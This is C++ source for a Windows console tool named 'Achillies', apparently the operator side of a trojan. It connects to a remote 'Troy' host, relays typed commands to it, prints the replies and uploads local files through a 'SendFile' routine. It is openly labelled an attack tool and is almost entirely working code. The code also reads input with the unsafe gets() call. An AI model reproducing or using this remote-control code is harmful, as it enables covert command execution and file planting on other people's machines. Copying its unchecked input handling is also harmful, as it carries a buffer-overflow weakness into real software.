// Preprocessor
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma comment(lib, "ws2_32.lib")

// Libraries
#include <fstream>
#include <iostream>
#include <winsock2.h>
#include <string>
#include <windows.h>
#include "FileHandler.h"

using namespace std;

// Global Variables
int AchilliesErr;
char* AchilliesMsg;
char inBuff[MEM_SIZE];
struct hostent *host;
SOCKET connSocket;
SOCKADDR_IN sockAddr;
HANDLE hConsole;

// Function Declaration
int AttackLoop(char*);
void AchilliesStop(void);
bool AchilliesStart(char*);


// Main Program
int main(int argc, char* argv[]){
    int lerr = 0;
    hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    fhReadFile("logo.dat");
    SetConsoleTextAttribute(hConsole, 11);
    cout << stdReadStream << endl;

    SetConsoleTextAttribute(hConsole, 14);
    cout << "\n  Achillies v1.0 - L.Swarnajith 2021-03-05";
    cout << "\n  ----------------------------------------\n";
    SetConsoleTextAttribute(hConsole, 7);

    if (argc > 1) lerr = AttackLoop(argv[1]);
    else lerr = AttackLoop("localhost");
    cout << "\n\n  [-] Troy closed : " << lerr << endl;
}

// Program Functions
int AttackLoop(char* tname){

    memset(inBuff, 0, MEM_SIZE);
    AchilliesStart(tname);
    AchilliesErr = WSAGetLastError();
    AchilliesMsg = (char*)malloc(MEM_SIZE);

    DWORD nWritten;
    OVERLAPPED nRead;

    cout << "  [+] All set. Waiting f'r thy commandeth !\n" << endl;
    while(AchilliesErr == 0) {

        cout << "  Ent'r commandeth : ";
        gets(AchilliesMsg);

        // Send a file
        if (strcmp(AchilliesMsg, "SendFile") == 0){
            // Send operation
            send(connSocket, AchilliesMsg, strlen(AchilliesMsg), 0);

            // Send Filename
            cout << "  Ent'r the file name : ";
            gets(AchilliesMsg);
            send(connSocket, AchilliesMsg, strlen(AchilliesMsg), 0);
            Sleep(200);

            // Send File
            cout << "  Sending" << fhReadFile(AchilliesMsg) << " bytes...\n" << endl;
            send(connSocket, stdReadStream, strlen(stdReadStream), 0);
            Sleep(200);
            // 10054
        }

        // Receive a file
        else if (strcmp(AchilliesMsg, "GetFile") == 0){
            cout << "  Ent'r the file path : ";
        }

        // Other
        else{
            send(connSocket, AchilliesMsg, strlen(AchilliesMsg), 0);
        }

        recv(connSocket, inBuff, sizeof(inBuff), 0);
        cout << "\n  Hath returned message :\n" << inBuff << "\n" << endl;
        ZeroMemory(inBuff, MEM_SIZE);
        AchilliesErr = WSAGetLastError();
    }

    AchilliesStop();
    return AchilliesErr;
}


// Achillies
void AchilliesStop() {
	cout << "  [-] Hath lost connection, did fail to sendeth last request." << endl;
	closesocket(connSocket);
	WSACleanup();
}

bool AchilliesStart(char* troyname) {

	WSADATA wsaData;
	AchilliesErr = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (AchilliesErr!=0){
		cout << "  [-] WSAstartup did fail." << endl;
		return false;
	}

	cout << "  [+] Wsastartup did success." << endl;

	connSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    cout << "  [*] Attempting to connecteth, " << troyname << endl;
	if ((host = (hostent*)gethostbyname(troyname)) == NULL) {
		cout << "[-] Did fail to resolveth hostname." << endl;
		WSACleanup();
		return false;
	}

	cout << "  [+] Resolving hostname did success." << endl;

	// Settings
	sockAddr.sin_port = htons(DESTPORT);
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

	// Connecting
	AchilliesErr = connect(connSocket, (SOCKADDR*)&sockAddr, sizeof(sockAddr));

	if (AchilliesErr) {
		cout << "  [-] Did fail to connecteth with the serv'r" << endl;
		WSACleanup();
		return false;
	}

	cout << "  [+] Connecteth to the serv'r did success." << endl;

	return true;
}


